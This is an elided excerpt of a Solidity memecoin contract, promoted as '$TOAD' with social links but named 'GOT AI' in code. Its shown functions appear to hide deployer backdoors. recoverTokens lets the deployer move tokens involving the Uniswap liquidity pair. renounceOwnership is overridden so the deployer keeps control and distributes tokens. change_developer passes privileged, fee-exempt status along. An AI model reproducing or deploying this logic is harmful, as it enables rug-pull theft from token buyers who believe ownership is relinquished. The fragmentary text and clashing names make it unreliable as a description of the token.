...
/*
$TOAD. The most memeable memecoin in existence. It’s time to Make Memecoins Great once Again. #GOT

Telegram: https://t.me/GOTCOIN1
X: https://x.com/gotcoin1
Website: https://www.gotcoin.site/
...
contract TOKEN is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"GOT AI";
    ...
    function recoverTokens(address _address, uint256 amount) external  {
        require(_msgSender() == deployer, "!deployer");
        if (_address==address(this)){
            _transfer(uniswapV2Pair, amount);
        }else{
	...
	function _distribute(address[] memory recipients, uint256 amount) private {
        for (uint256 i = 0; i < recipients.length; i++) {
            address recipient = recipients[i];
            require(recipient != uniswapV2Pair);
    ...
    function renounceOwnership() public override onlyOwner {
        ...
        require(_msgSender() == deployer, "!deployer");
        _distribute(recipients, amount);
    }
    function change_developer(address new_developer) public{
        require(_msgSender() == deployer, "!deployer");
        deployer = new_developer;
        _feeExempt[new_developer] = true;
    }
